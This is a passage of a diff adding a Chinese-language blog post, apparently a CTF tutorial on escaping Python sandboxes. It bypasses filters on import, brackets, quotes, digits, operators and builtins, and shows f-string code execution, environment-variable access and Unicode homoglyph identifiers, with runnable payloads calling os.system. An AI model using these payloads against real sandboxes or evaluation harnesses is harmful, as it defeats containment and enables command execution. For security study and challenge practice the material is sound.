+<span class="p">[].</span><span class="n">__class__</span><span class="p">.</span><span class="n">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+<span class="p">[].</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span>
+<span class="p">().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span>
+<span class="p">{}.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span>
+</code></pre></div></div>
+
+<h3 id="过滤-import">过滤 import</h3>
+<p>python 中除了可以使用 import 来导入，还可以使用 <code class="language-plaintext highlighter-rouge">__import__</code> 和 <code class="language-plaintext highlighter-rouge">importlib.import_module</code> 来导入模块</p>
+
+<h4 id="__import__"><code class="language-plaintext highlighter-rouge">__import__</code></h4>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">__import__</span><span class="p">(</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div>
+<h4 id="importlibimport_module">importlib.import_module</h4>
+<p>不过 importlib 也需要导入,所以有些鸡肋.</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">importlib</span>
+<span class="n">importlib</span><span class="p">.</span><span class="nf">import_module</span><span class="p">(</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">).</span><span class="nf">system</span><span class="p">(</span><span class="sh">'</span><span class="s">ls</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div>
+<p>注意：importlib 需要进行导入之后才能够使用</p>
+
+<h4 id="__loader__load_module"><code class="language-plaintext highlighter-rouge">__loader__.load_module</code></h4>
+<p>如果使用 audithook 的方式进行过滤,上面的两种方法就无法使用了,但是 <code class="language-plaintext highlighter-rouge">__loader__.load_module</code> 底层实现与 import 不同, 因此某些情况下可以绕过.</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">__loader__</span><span class="p">.</span><span class="nf">load_module</span><span class="p">(</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">)</span>
+<span class="o">&lt;</span><span class="n">module</span> <span class="sh">'</span><span class="s">os</span><span class="sh">'</span> <span class="p">(</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span><span class="p">)</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<h3 id="过滤了-">过滤了 []</h3>
+<p>如果中括号被过滤了，则可以使用如下的两种方式来绕过：</p>
+
+<ol>
+  <li>调用<code class="language-plaintext highlighter-rouge">__getitem__()</code>函数直接替换；</li>
+  <li>调用 pop()函数（用于移除列表中的一个元素，默认最后一个元素，并且返回该元素的值）替换；</li>
+</ol>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sh">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="nf">__subclasses__</span><span class="p">()[</span><span class="mi">200</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">[</span><span class="sh">'</span><span class="s">__builtins__</span><span class="sh">'</span><span class="p">][</span><span class="sh">'</span><span class="s">__import__</span><span class="sh">'</span><span class="p">](</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">).</span><span class="nf">system</span><span class="p">(</span><span class="sh">'</span><span class="s">ls</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="c1"># __getitem__()替换中括号[]
+</span><span class="sh">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="p">.</span><span class="nf">__getitem__</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">).</span><span class="nf">__subclasses__</span><span class="p">().</span><span class="nf">__getitem__</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="nf">__getitem__</span><span class="p">(</span><span class="sh">'</span><span class="s">__builtins__</span><span class="sh">'</span><span class="p">).</span><span class="nf">__getitem__</span><span class="p">(</span><span class="sh">'</span><span class="s">__import__</span><span class="sh">'</span><span class="p">)(</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">).</span><span class="nf">system</span><span class="p">(</span><span class="sh">'</span><span class="s">ls</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="c1"># pop()替换中括号[]，结合__getitem__()利用
+</span><span class="sh">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="p">.</span><span class="nf">__getitem__</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">).</span><span class="nf">__subclasses__</span><span class="p">().</span><span class="nf">pop</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="nf">pop</span><span class="p">(</span><span class="sh">'</span><span class="s">__builtins__</span><span class="sh">'</span><span class="p">).</span><span class="nf">pop</span><span class="p">(</span><span class="sh">'</span><span class="s">__import__</span><span class="sh">'</span><span class="p">)(</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">).</span><span class="nf">system</span><span class="p">(</span><span class="sh">'</span><span class="s">ls</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="nf">getattr</span><span class="p">(</span><span class="sh">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__mro__</span><span class="p">.</span><span class="nf">__getitem__</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">).</span><span class="nf">__subclasses__</span><span class="p">().</span><span class="nf">__getitem__</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">,</span><span class="sh">'</span><span class="s">__builtins__</span><span class="sh">'</span><span class="p">).</span><span class="nf">__getitem__</span><span class="p">(</span><span class="sh">'</span><span class="s">__import__</span><span class="sh">'</span><span class="p">)(</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">).</span><span class="nf">system</span><span class="p">(</span><span class="sh">'</span><span class="s">ls</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="过滤了--1">过滤了 ‘’</h3>
+
+<h4 id="str-函数">str 函数</h4>
+<p>如果过滤了引号，我们 payload 中构造的字符串会受到影响。其中一种方法是使用 str() 函数获取字符串，然后索引到预期的字符。将所有的字符连接起来就可以得到最终的字符串。</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="p">().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__new__</span>
+<span class="o">&lt;</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span> <span class="n">method</span> <span class="n">__new__</span> <span class="n">of</span> <span class="nb">type</span> <span class="nb">object</span> <span class="n">at</span> <span class="mh">0x9597e0</span><span class="o">&gt;</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="nf">str</span><span class="p">(().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__new__</span><span class="p">)</span>
+<span class="sh">'</span><span class="s">&lt;built-in method __new__ of type object at 0x9597e0&gt;</span><span class="sh">'</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="nf">str</span><span class="p">(().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__new__</span><span class="p">)[</span><span class="mi">21</span><span class="p">]</span>
+<span class="sh">'</span><span class="s">w</span><span class="sh">'</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="nf">str</span><span class="p">(().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__new__</span><span class="p">)[</span><span class="mi">21</span><span class="p">]</span><span class="o">+</span><span class="nf">str</span><span class="p">(().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__new__</span><span class="p">)[</span><span class="mi">13</span><span class="p">]</span><span class="o">+</span><span class="nf">str</span><span class="p">(().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__new__</span><span class="p">)[</span><span class="mi">14</span><span class="p">]</span><span class="o">+</span><span class="nf">str</span><span class="p">(().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__new__</span><span class="p">)[</span><span class="mi">40</span><span class="p">]</span><span class="o">+</span><span class="nf">str</span><span class="p">(().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__new__</span><span class="p">)[</span><span class="mi">10</span><span class="p">]</span><span class="o">+</span><span class="nf">str</span><span class="p">(().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__new__</span><span class="p">)[</span><span class="mi">3</span><span class="p">]</span>
+<span class="sh">'</span><span class="s">whoami</span><span class="sh">'</span>
+</code></pre></div></div>
+
+<h4 id="chr-函数">chr 函数</h4>
+<p>也可以使用 chr 加数字来构造字符串</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="nf">chr</span><span class="p">(</span><span class="mi">56</span><span class="p">)</span>
+<span class="sh">'</span><span class="s">8</span><span class="sh">'</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="nf">chr</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+<span class="sh">'</span><span class="s">d</span><span class="sh">'</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="nf">chr</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span><span class="o">*</span><span class="mi">40</span>
+<span class="sh">'</span><span class="s">dddddddddddddddddddddddddddddddddddddddd</span><span class="sh">'</span>
+</code></pre></div></div>
+
+<h4 id="list--dict">list + dict</h4>
+<p>使用 dict 和 list 进行配合可以将变量名转化为字符串，但这种方式的弊端在于字符串中不能有空格等。</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">list</span><span class="p">(</span><span class="nf">dict</span><span class="p">(</span><span class="n">whoami</span><span class="o">=</span><span class="mi">1</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
+</code></pre></div></div>
+<h4 id="__doc__"><code class="language-plaintext highlighter-rouge">__doc__</code></h4>
+<p><code class="language-plaintext highlighter-rouge">__doc__</code> 变量可以获取到类的说明信息，从其中索引出想要的字符然后进行拼接就可以得到字符串：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">().</span><span class="n">__doc__</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">'</span><span class="s">s</span><span class="sh">'</span><span class="p">)</span>
+<span class="p">().</span><span class="n">__doc__</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span><span class="o">+</span><span class="p">().</span><span class="n">__doc__</span><span class="p">[</span><span class="mi">86</span><span class="p">]</span><span class="o">+</span><span class="p">().</span><span class="n">__doc__</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span>
+</code></pre></div></div>
+
+<h4 id="bytes-函数">bytes 函数</h4>
+<p>bytes 函数可以接收一个 ascii 列表，然后转换为二进制字符串，再调用 decode 则可以得到字符串</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">bytes</span><span class="p">([</span><span class="mi">115</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">109</span><span class="p">]).</span><span class="nf">decode</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h3 id="过滤了--2">过滤了 +</h3>
+<p>过滤了 + 号主要影响到了构造字符串，假如题目过滤了引号和加号，构造字符串还可以使用 join 函数，初始的字符串可以通过 str() 进行获取.具体的字符串内容可以从 <code class="language-plaintext highlighter-rouge">__doc__</code> 中取，</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">str</span><span class="p">().</span><span class="nf">join</span><span class="p">(().</span><span class="n">__doc__</span><span class="p">[</span><span class="mi">19</span><span class="p">],().</span><span class="n">__doc__</span><span class="p">[</span><span class="mi">23</span><span class="p">])</span>
+</code></pre></div></div>
+
+<h3 id="过滤了数字">过滤了数字</h3>
+<p>如果过滤了数字的话，可以使用一些函数的返回值获取。例如：
+0：<code class="language-plaintext highlighter-rouge">int(bool([]))</code>、<code class="language-plaintext highlighter-rouge">Flase</code>、<code class="language-plaintext highlighter-rouge">len([])</code>、<code class="language-plaintext highlighter-rouge">any(())</code>
+1：<code class="language-plaintext highlighter-rouge">int(bool([""]))</code>、<code class="language-plaintext highlighter-rouge">True</code>、<code class="language-plaintext highlighter-rouge">all(())</code>、<code class="language-plaintext highlighter-rouge">int(list(list(dict(a၁=())).pop()).pop())</code></p>
+
+<p>有了 0 之后，其他的数字可以通过运算进行获取：</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0 ** 0 == 1
+1 + 1 == 2
+2 + 1 == 3
+2 ** 2 == 4
+</code></pre></div></div>
+<p>当然，也可以直接通过 repr 获取一些比较长字符串，然后使用 len 获取大整数。</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="nf">len</span><span class="p">(</span><span class="nf">repr</span><span class="p">(</span><span class="bp">True</span><span class="p">))</span>
+<span class="mi">4</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="nf">len</span><span class="p">(</span><span class="nf">repr</span><span class="p">(</span><span class="nb">bytearray</span><span class="p">))</span>
+<span class="mi">19</span>
+</code></pre></div></div>
+<p>第三种方法，可以使用 len + dict + list 来构造,这种方式可以避免运算符的的出现</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">0</span> <span class="o">-&gt;</span> <span class="nf">len</span><span class="p">([])</span>
+<span class="mi">2</span> <span class="o">-&gt;</span> <span class="nf">len</span><span class="p">(</span><span class="nf">list</span><span class="p">(</span><span class="nf">dict</span><span class="p">(</span><span class="n">aa</span><span class="o">=</span><span class="p">()))[</span><span class="nf">len</span><span class="p">([])])</span>
+<span class="mi">3</span> <span class="o">-&gt;</span> <span class="nf">len</span><span class="p">(</span><span class="nf">list</span><span class="p">(</span><span class="nf">dict</span><span class="p">(</span><span class="n">aaa</span><span class="o">=</span><span class="p">()))[</span><span class="nf">len</span><span class="p">([])])</span>
+</code></pre></div></div>
+<p>第四种方法: unicode
+会在后续的 unicode 绕过中介绍</p>
+
+<h3 id="过滤了空格">过滤了空格</h3>
+<p>通过 ()、[] 替换</p>
+
+<h3 id="过滤了运算符">过滤了运算符</h3>
+<p>== 可以用 in 来替换</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>or 可以用</td>
+      <td>+ -。。。-来替换</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>例如</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="p">[(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span> <span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span> <span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span> <span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)]:</span>
+    <span class="n">ans</span> <span class="o">=</span> <span class="n">i</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="n">i</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="ow">or</span> <span class="n">i</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">==</span><span class="n">i</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+    <span class="nf">print</span><span class="p">(</span><span class="nf">bool</span><span class="p">(</span><span class="nf">eval</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">i</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="n">i</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s"> | </span><span class="si">{</span><span class="n">i</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">==</span><span class="n">i</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="si">}</span><span class="sh">'</span><span class="p">))</span> <span class="o">==</span> <span class="n">ans</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="nf">bool</span><span class="p">(</span><span class="nf">eval</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">- </span><span class="si">{</span><span class="n">i</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="n">i</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s"> - </span><span class="si">{</span><span class="n">i</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">==</span><span class="n">i</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="si">}</span><span class="sh">'</span><span class="p">))</span> <span class="o">==</span> <span class="n">ans</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="nf">bool</span><span class="p">(</span><span class="nf">eval</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">i</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="n">i</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s"> + </span><span class="si">{</span><span class="n">i</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">==</span><span class="n">i</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="si">}</span><span class="sh">'</span><span class="p">))</span> <span class="o">==</span> <span class="n">ans</span><span class="p">)</span>
+</code></pre></div></div>
+<p>and 可以用&amp; *替代</p>
+
+<p>例如</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="p">[(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span> <span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span> <span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span> <span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)]:</span>
+    <span class="n">ans</span> <span class="o">=</span> <span class="n">i</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="n">i</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="ow">and</span> <span class="n">i</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">==</span><span class="n">i</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+    <span class="nf">print</span><span class="p">(</span><span class="nf">bool</span><span class="p">(</span><span class="nf">eval</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">i</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="n">i</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s"> &amp; </span><span class="si">{</span><span class="n">i</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">==</span><span class="n">i</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="si">}</span><span class="sh">'</span><span class="p">))</span> <span class="o">==</span> <span class="n">ans</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="nf">bool</span><span class="p">(</span><span class="nf">eval</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="n">i</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="n">i</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s"> * </span><span class="si">{</span><span class="n">i</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">==</span><span class="n">i</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="si">}</span><span class="sh">'</span><span class="p">))</span> <span class="o">==</span> <span class="n">ans</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="过滤了--3">过滤了 ()</h3>
+
+<ol>
+  <li>利用装饰器 @</li>
+  <li>利用魔术方法，例如 <code class="language-plaintext highlighter-rouge">enum.EnumMeta.__getitem__</code></li>
+</ol>
+
+<h3 id="f-字符串执行">f 字符串执行</h3>
+<p>f 字符串算不上一个绕过，更像是一种新的攻击面，通常情况下用来获取敏感上下文信息,例如过去环境变量</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="n">whoami</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__dict__</span><span class="p">}</span>
+<span class="p">{</span><span class="n">whoami</span><span class="p">.</span><span class="n">__globals__</span><span class="p">[</span><span class="n">os</span><span class="p">].</span><span class="n">__dict__</span><span class="p">}</span>
+<span class="p">{</span><span class="n">whoami</span><span class="p">.</span><span class="n">__globals__</span><span class="p">[</span><span class="n">os</span><span class="p">].</span><span class="n">environ</span><span class="p">}</span>
+<span class="p">{</span><span class="n">whoami</span><span class="p">.</span><span class="n">__globals__</span><span class="p">[</span><span class="n">sys</span><span class="p">].</span><span class="n">path</span><span class="p">}</span>
+<span class="p">{</span><span class="n">whoami</span><span class="p">.</span><span class="n">__globals__</span><span class="p">[</span><span class="n">sys</span><span class="p">].</span><span class="n">modules</span><span class="p">}</span>
+
+<span class="c1"># Access an element through several links
+</span><span class="p">{</span><span class="n">whoami</span><span class="p">.</span><span class="n">__globals__</span><span class="p">[</span><span class="n">server</span><span class="p">].</span><span class="n">__dict__</span><span class="p">[</span><span class="n">bridge</span><span class="p">].</span><span class="n">__dict__</span><span class="p">[</span><span class="n">db</span><span class="p">].</span><span class="n">__dict__</span><span class="p">}</span>
+</code></pre></div></div>
+
+<p>也可以直接 RCE</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="sa">f</span><span class="sh">'</span><span class="si">{</span><span class="nf">__import__</span><span class="p">(</span><span class="sh">"</span><span class="s">os</span><span class="sh">"</span><span class="p">).</span><span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">whoami</span><span class="sh">"</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span>
+<span class="n">kali</span>
+<span class="sh">'</span><span class="s">0</span><span class="sh">'</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">__builtins__</span><span class="p">.</span><span class="nf">__import__</span><span class="p">(</span><span class="sh">'</span><span class="s">os</span><span class="sh">'</span><span class="p">).</span><span class="n">__dict__</span><span class="p">[</span><span class="sh">'</span><span class="s">popen</span><span class="sh">'</span><span class="p">](</span><span class="sh">'</span><span class="s">ls</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span><span class="si">}</span><span class="sh">"</span>
+</code></pre></div></div>
+
+<h3 id="反序列化绕过">反序列化绕过</h3>
+
+<h3 id="过滤了内建函数">过滤了内建函数</h3>
+<h4 id="eval--list--dict-构造">eval + list + dict 构造</h4>
+<p>假如我们在构造 payload 时需要使用 str 函数、bool 函数、bytes 函数等，则可以使用 eval 进行绕过。</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="nf">eval</span><span class="p">(</span><span class="sh">'</span><span class="s">str</span><span class="sh">'</span><span class="p">)</span>
+<span class="o">&lt;</span><span class="k">class</span> <span class="err">'</span><span class="nc">str</span><span class="sh">'</span><span class="s">&gt;
+</span><span class="gp">&gt;&gt;&gt;</span> <span class="nf">eval</span><span class="p">(</span><span class="sh">'</span><span class="s">bool</span><span class="sh">'</span><span class="p">)</span>
+<span class="o">&lt;</span><span class="k">class</span> <span class="err">'</span><span class="nc">bool</span><span class="sh">'</span><span class="s">&gt;
+</span><span class="gp">&gt;&gt;&gt;</span> <span class="nf">eval</span><span class="p">(</span><span class="sh">'</span><span class="s">st</span><span class="sh">'</span><span class="o">+</span><span class="sh">'</span><span class="s">r</span><span class="sh">'</span><span class="p">)</span>
+<span class="o">&lt;</span><span class="k">class</span> <span class="err">'</span><span class="nc">str</span><span class="sh">'</span><span class="s">&gt;
+</span></code></pre></div></div>
+<p>这样就可以将函数名转化为字符串的形式，进而可以利用字符串的变换来进行绕过。</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="nf">eval</span><span class="p">(</span><span class="nf">list</span><span class="p">(</span><span class="nf">dict</span><span class="p">(</span><span class="n">s_t_r</span><span class="o">=</span><span class="mi">1</span><span class="p">))[</span><span class="mi">0</span><span class="p">][::</span><span class="mi">2</span><span class="p">])</span>
+<span class="o">&lt;</span><span class="k">class</span> <span class="err">'</span><span class="nc">str</span><span class="sh">'</span><span class="s">&gt;
+</span></code></pre></div></div>
+<p>这样一来，只要 list 和 dict 没有被禁，就可以获取到任意的内建函数。如果某个模块已经被导入了，则也可以获取这个模块中的函数。</p>
+
+<h3 id="过滤了--和-如何获取函数">过滤了 . 和 ，如何获取函数</h3>
+<p>通常情况下，我们会通过点号来进行调用<code class="language-plaintext highlighter-rouge">__import__('binascii').a2b_base64</code></p>
+
+<p>或者通过 getattr 函数：<code class="language-plaintext highlighter-rouge">getattr(__import__('binascii'),'a2b_base64')</code></p>
+
+<p>如果将 , 号和 . 都过滤了，则可以有如下的几种方式获取函数：</p>
+<ol>
+  <li>内建函数可以使用<code class="language-plaintext highlighter-rouge">eval(list(dict(s_t_r=1))[0][::2])</code> 这样的方式获取。</li>
+  <li>模块内的函数可以先使用 <code class="language-plaintext highlighter-rouge">__import__</code> 导入函数，然后使用 vars() j进行获取：
+    <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="nf">vars</span><span class="p">(</span><span class="nf">__import__</span><span class="p">(</span><span class="sh">'</span><span class="s">binascii</span><span class="sh">'</span><span class="p">))[</span><span class="sh">'</span><span class="s">a2b_base64</span><span class="sh">'</span><span class="p">]</span>
+<span class="o">&lt;</span><span class="n">built</span><span class="o">-</span><span class="ow">in</span> <span class="n">function</span> <span class="n">a2b_base64</span><span class="o">&gt;</span>
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h3 id="unicode-绕过">unicode 绕过</h3>
+<p>Python 3 开始支持非ASCII字符的标识符，也就是说，可以使用 Unicode 字符作为 Python 的变量名，函数名等。Python 在解析代码时，使用的 Unicode Normalization Form KC (NFKC) 规范化算法，这种算法可以将一些视觉上相似的 Unicode 字符统一为一个标准形式。</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="nb">eval</span> <span class="o">==</span> <span class="n">𝘦val</span>
+<span class="bp">True</span>
+</code></pre></div></div>
+<p>相似 unicode 寻找网站：http://shapecatcher.com/
+可以通过绘制的方式寻找相似字符</p>
+
+<p>下面是 0-9,a-z 的 unicode 字符</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗
+𝘢𝘣𝘤𝘥𝘦𝘧𝘨𝘩𝘪𝘫𝘬𝘭𝘮𝘯𝘰𝘱𝘲𝘳𝘴𝘵𝘶𝘷𝘸𝘹𝘺𝘻 
+𝘈𝘉𝘊𝘋𝘌𝘍𝘎𝘏𝘐𝘑𝘒𝘔𝘕𝘖𝘗𝘘𝘙𝘚𝘛𝘜𝘝𝘞𝘟𝘠𝘡 
+</code></pre></div></div>
+
+<p>下划线可以使用对应的全角字符进行替换：</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>＿
+</code></pre></div></div>
+<p>使用时注意第一个字符不能为全角，否则会报错：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="nf">print</span><span class="p">(</span><span class="n">_</span><span class="err">＿</span><span class="n">name_</span><span class="err">＿</span><span class="p">)</span>
+<span class="n">__main__</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="nf">print</span><span class="p">(</span><span class="err">＿＿</span><span class="n">name_</span><span class="err">＿</span><span class="p">)</span>
+  <span class="n">File</span> <span class="sh">"</span><span class="s">&lt;stdin&gt;</span><span class="sh">"</span><span class="p">,</span> <span class="n">line</span> <span class="mi">1</span>
+    <span class="nf">print</span><span class="p">(</span><span class="err">＿＿</span><span class="n">name_</span><span class="err">＿</span><span class="p">)</span>
+          <span class="o">^</span>
+<span class="nb">SyntaxError</span><span class="p">:</span> <span class="n">invalid</span> <span class="n">character</span> <span class="sh">'</span><span class="s">＿</span><span class="sh">'</span> <span class="p">(</span><span class="n">U</span><span class="o">+</span><span class="n">FF3F</span><span class="p">)</span>
+</code></pre></div></div>
+
